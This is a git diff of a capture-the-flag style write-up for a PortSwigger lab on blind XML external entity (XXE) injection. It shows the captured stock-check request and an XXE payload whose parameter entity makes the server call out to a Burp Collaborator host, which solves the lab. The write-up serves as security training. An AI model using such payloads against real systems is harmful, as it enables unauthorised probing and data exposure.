@@ -32,7 +32,7 @@ Clicking on checkstock feature , browser sends the following request.
 ```xml
 POST /product/stock HTTP/1.1
 Host: 0a0f001d038e90d781560cbc008a008e.web-security-academy.net
-Cookie: session=tWHXpacEnJFUs1Ubp8MfIn8s0crmL4Uc
+Cookie: session=gwBsRlQTEvY287RWKXKNzyrlafd6MhsP
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
 Accept: */*
 Accept-Language: en-US,en;q=0.5
@@ -54,30 +54,27 @@ Connection: close
 </stockCheck>
 ```
 
-First we will declare a DOCTYPE eith parameterized entitites (**%**) which contains the url of our collaborator server -`<!DOCTYPE root [<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x">]>`
+First we will declare a DOCTYPE eith parameterized entitites (**%**) which contains the url of our collaborator server -`<!DOCTYPE root [<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %xxe; ]>` & in that we can reference the parameterized entitiy using - `%ext;`
 
-Then in the `<productID>` , we can reference the parameterized entitiy using - `%ext;`
-
+> Reference - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#basic-blind-xxe
 
 **Payload -**
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE root [<!ENTITY % ext SYSTEM "http://jre5j77p3ggwt0aat4r2larlwc22qr.oastify.com/x">]>
- <stockCheck>
- <productId>% ext;</productId>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://ibxj9hi7igb643lzee9r5ghu7ldc11.oastify.com"> %xxe; ]> 
+ <productId>% 1</productId>
  <storeId>1</storeId>
 </stockCheck>
 ```
 
+"XML parsing error"
 
-The response says - `Invalid product ID` which means the product id  is invalid but it is a indication that the xml parser parsed the xml query & made outbound request to our collaborator-server.
+In the response it says that - `XML parsing error` but it means that the xml parser indeed parsed the xml code and made an outbound request to our collaborator server.
 
-![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/89bb94c8-ebee-466d-b967-94c6c98ffbcd)
+![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/e7d2d8f7-c3fe-416b-82a4-102e382a30a9)
 
-
-
-
+And we've solved the lab !
 
 
 
